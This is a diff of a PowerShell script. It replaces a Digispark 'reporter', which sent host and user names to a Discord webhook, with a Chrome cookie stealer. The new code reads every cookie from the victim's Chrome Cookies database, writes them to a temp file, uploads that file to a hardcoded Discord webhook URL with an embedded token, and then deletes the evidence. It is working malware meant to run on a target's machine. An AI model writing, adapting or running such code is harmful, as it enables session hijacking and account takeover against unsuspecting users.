@@ -1,43 +1,62 @@
-# webhook_reporter_en.ps1
-# This script will be downloaded and executed on the target computer.
+# Define the Discord webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/1382033925676994591/fD2Tkr-ggL7QXrjiGs3phMu80IyTcQOPGUBstF4-vmDRVa9prGbeISQFqAGrnFmuq72a"
 
-# !!! REPLACE THIS URL WITH YOUR ACTUAL DISCORD WEBHOOK URL !!!
-# Example: 'https://discord.com/api/webhooks/123456789012345678/aBcDeFgHiJkLmNoPqRsTuVwXyZ'
-$webhookUrl = 'https://discord.com/api/webhooks/1382033925676994591/fD2Tkr-ggL7QXrjiGs3phMu80IyTcQOPGUBstF4-vmDRVa9prGbeISQFqAGrnFmuq72a'
+# Get the current user's username and construct the path to Chrome's cookies database
+$username = $env:USERNAME
+$chromePath = "C:\Users\$username\AppData\Local\Google\Chrome\User Data\Default\Cookies"
 
-# Gather system information
-$computerName = $env:COMPUTERNAME
-$userName = $env:USERNAME
+# Check if the Cookies file exists
+if (Test-Path $chromePath) {
+    try {
+        # Load the SQLite assembly (assumes System.Data.SQLite.dll is available)
+        [System.Reflection.Assembly]::LoadWithPartialName("System.Data.SQLite") | Out-Null
 
-# Formulate JSON payload for Discord Webhook
-$payload = @{
-    username = "Digispark Reporter"
-    content = "New report from Digispark!"
-    embeds = @(
-        @{
-            title = "Host Information"
-            color = 65280 # Green color in decimal format
-            fields = @(
-                @{name = "Computer Name"; value = $computerName; inline = $true},
-                @{name = "User Name"; value = $userName; inline = $true}
-            )
+        # Create a connection to the SQLite database
+        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$chromePath;Version=3;")
+        $conn.Open()
+
+        # Create a command to query all cookies
+        $cmd = $conn.CreateCommand()
+        $cmd.CommandText = "SELECT host_key, name, value FROM cookies"
+
+        # Execute the query and read the results
+        $reader = $cmd.ExecuteReader()
+        $cookieData = @()
+        while ($reader.Read()) {
+            $cookieData += "Host: " + $reader["host_key"] + ", Name: " + $reader["name"] + ", Value: " + $reader["value"]
         }
-    )
-}
 
-# Convert PowerShell object to JSON
-$jsonPayload = ConvertTo-Json -InputObject $payload -Depth 4 # Depth 4 for proper nesting
+        # Close the connection
+        $reader.Close()
+        $conn.Close()
 
-# Send HTTP POST request to Discord webhook
-try {
-    Invoke-WebRequest -Uri $webhookUrl -Method POST -ContentType 'application/json' -Body $jsonPayload -TimeoutSec 10 -ErrorAction Stop
-}
-catch {
-    # Optional: Add error logging here if needed.
-    # Example: Add-Content -Path "$env:TEMP\digispark_error.log" -Value "Error sending report: $($_.Exception.Message)"
-}
+        # Save the cookie data to a text file
+        $outputFile = "$env:TEMP\cookies.txt"
+        $cookieData | Out-File -FilePath $outputFile -Encoding UTF8
 
-# (Optional) Close the PowerShell window after script execution
-# If PowerShell is run with -NoE, it will remain open.
-# If you want the window to close, you can add:
-# exit
+        # Prepare the form data to send the file to the Discord webhook
+        $fileContent = Get-Content -Path $outputFile -Raw
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $body = "--$boundary`r`n" +
+                "Content-Disposition: form-data; name=`"file`"; filename=`"cookies.txt`"`r`n" +
+                "Content-Type: text/plain`r`n`r`n" +
+                $fileContent + "`r`n" +
+                "--$boundary--`r`n"
+
+        # Send the file to the Discord webhook
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
+
+        # Clean up the temporary file
+        Remove-Item -Path $outputFile
+    }
+    catch {
+        # Basic error handling: send an error message to the webhook if something fails
+        $errorMessage = "Error: " + $_.Exception.Message
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body @{content=$errorMessage} -ContentType "application/json"
+    }
+}
+else {
+    # If the Cookies file is not found, notify via the webhook
+    $message = "Chrome cookies file not found for user $username"
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body @{content=$message} -ContentType "application/json"
+}
